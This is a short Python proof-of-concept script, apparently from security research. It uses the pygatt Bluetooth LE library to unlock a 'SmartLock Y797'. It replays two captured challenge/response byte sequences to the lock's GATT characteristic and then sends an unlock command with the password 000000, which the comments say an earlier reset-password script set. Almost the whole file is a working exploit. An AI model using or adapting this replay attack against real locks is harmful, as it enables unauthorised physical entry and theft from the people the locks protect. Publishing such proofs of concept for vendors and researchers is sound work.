#!/usr/bin/python

# Requirements: https://github.com/peplin/pygatt
# sudo pip install pygatt
# sudo pip install "pygatt[GATTTOOL]"

import pygatt, logging

# SmartLock Y797 - Unlock - Demo
# We assume that the password was previouly set to 000000
# with the 01_SmartLockY797_reset_password.py script
# MAC address: 11:22:33:44:55:66

logging.basicConfig()
logging.getLogger('pygatt').setLevel(logging.NOTSET)

adapter = pygatt.GATTToolBackend()

try:
    adapter.start()
    # connect to the device
    device = adapter.connect('11:22:33:44:55:66')
    print('Connected to the device')

    # re-play the challenges
    device.char_write('0000fff1-0000-1000-8000-00805f9b34fb', bytearray([0xa1, 0x37, 0x34, 0x31, 0x36, 0x38, 0x39, 0x05, 0x78, 0x9a, 0x14, 0x0a, 0x28, 0x5b, 0x1d, 0x0d, 0x2a, 0x61, 0x3d]))
    device.char_write('0000fff1-0000-1000-8000-00805f9b34fb', bytearray([0xa1, 0x37, 0x34, 0x31, 0x36, 0x38, 0x39, 0x09, 0x42, 0xa9, 0xe7, 0xac, 0x03, 0xbb, 0x7b, 0xa0, 0x21, 0xb4, 0x5c, 0xb2]))
    print('Challenge/response replayed')

    # open the lock
    device.char_write('0000fff1-0000-1000-8000-00805f9b34fb', bytearray([0xa1, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x01]))
    print('Lock unlocked')
finally:
    adapter.stop()
